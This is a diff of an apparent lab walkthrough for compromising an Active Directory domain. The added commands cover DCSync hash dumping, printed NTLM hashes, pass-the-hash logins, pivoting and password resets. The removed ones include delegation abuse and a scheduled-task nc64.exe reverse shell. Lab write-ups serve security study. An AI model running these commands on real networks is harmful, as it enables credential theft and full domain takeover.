@@ -211,12 +211,6 @@ On bloodhound we can see that pgibbons can control the user salvador
 
 <figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
-{% code overflow="wrap" %}
-```
-.\RunasCs.exe pgibbons "I l0ve going Fishing!" "powershell.exe /c 'net user salvador hacker1 /domain'"
-```
-{% endcode %}
-
 ```
 net rpc password "salvador" -U "corp.local"/"pgibbons" -S "172.16.1.5"
 ```
@@ -225,7 +219,7 @@ net rpc password "salvador" -U "corp.local"/"pgibbons" -S "172.16.1.5"
 
 {% code overflow="wrap" %}
 ```
-net rpc group addmem "SECURITY ENGINEERS" "salvador" -U "corp.local"/"salvador"%"hacker1" -S "172.16.1.5"
+net rpc group addmem "SECURITY ENGINEERS" "salvador" -U "corp.local"/"salvador"%"salvador" -S "172.16.1.5"
 ```
 {% endcode %}
 
@@ -241,52 +235,87 @@ now login with remmina
 
 <figure><img src="../.gitbook/assets/immagine (45).png" alt=""><figcaption></figcaption></figure>
 
-Import Powermad.ps1 and then
+Add to salvador the DCSync right with powerview as System authority from web01
 
 {% code overflow="wrap" %}
 ```
-New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+Add-ObjectACL -PrincipalIdentity SALVADOR -Rights DCSync
 ```
 {% endcode %}
 
-Import Powerview and then
+The Dump all the hash
+
+```
+impacket-secretsdump -dc-ip 172.16.1.5 corp.local/salvador:salvador@172.16.1.5
+```
+
+iamtheadministrator:1122:aad3b435b51404eeaad3b435b51404ee:70016778cb0524c799ac25b439bd67e0:::
+
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cba2ed22077aa56ae957bcf43a8d82f8:::
+
+svc\_devops:3609:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::
+
+Now enter with evil-winrm
+
+```
+evil-winrm -u iamtheadministrator -H 70016778cb0524c799ac25b439bd67e0 -i 172.16.1.5
+```
+
+## SQL01.CORP.LOCAL
+
+Enter with the admin credentials
+
+```
+evil-winrm -u iamtheadministrator -H 70016778cb0524c799ac25b439bd67e0 -i 172.16.1.15
+```
+
+get the flag
+
+## FS01.CORP.LOCAL
+
+Enter with the admin credentials
+
+```
+evil-winrm -u iamtheadministrator -H 70016778cb0524c799ac25b439bd67e0 -i 172.16.1.26
+```
+
+get the flag
+
+## WSADM.CORP.LOCAL
+
+Enter with the admin credentials
+
+```
+evil-winrm -u iamtheadministrator -H 70016778cb0524c799ac25b439bd67e0 -i 172.16.1.36
+```
+
+get the flag
+
+## Pivoting to 172.16.2.0/24
+
+Use ligolo-ng. After that we can ping sweep to find hosts on the other Lan
+
+```
+fping -s -g 172.16.2.0/24
+```
+
+<figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+
+## WS03.dev.ADMIN.OFFSHORE.COM
+
+svc\_devops is local admin on WS03 so change his password with powerview
 
 {% code overflow="wrap" %}
 ```
-$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+$cred = ConvertTo-SecureString "Password123" -AsPlainText -force
+Set-DomainUserPassword -identity svc_devops -accountpassword $cred
 ```
 {% endcode %}
 
-We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:
+and then to access
 
-{% code overflow="wrap" %}
 ```
-$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
-$SDBytes = New-Object byte[] ($SD.BinaryLength)
-$SD.GetBinaryForm($SDBytes, 0)
-```
-{% endcode %}
-
-Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
-
-{% code overflow="wrap" %}
-```
-Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
-```
-{% endcode %}
-
-
-
-{% code overflow="wrap" %}
-```powershell
-schtasks /create /S WEB-WIN01 /SC Weekly /RU "NT Authority\SYSTEM" /TN "hacker" /TR "powershell.exe -c 'C:\Users\cyber_adm\nc64.exe 172.16.1.23 4444 -e powershell.exe'"
-```
-{% endcode %}
-
-and launch it with a listener open
-
-```powershell
-schtasks /Run /S web-win01.corp.local /TN "hacker"
+impacket-psexec 'svc_devops:Password123'@172.16.2.102 cmd.exe
 ```
 
-Now use rubeus to forge the tickets and get a shell on share
+<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
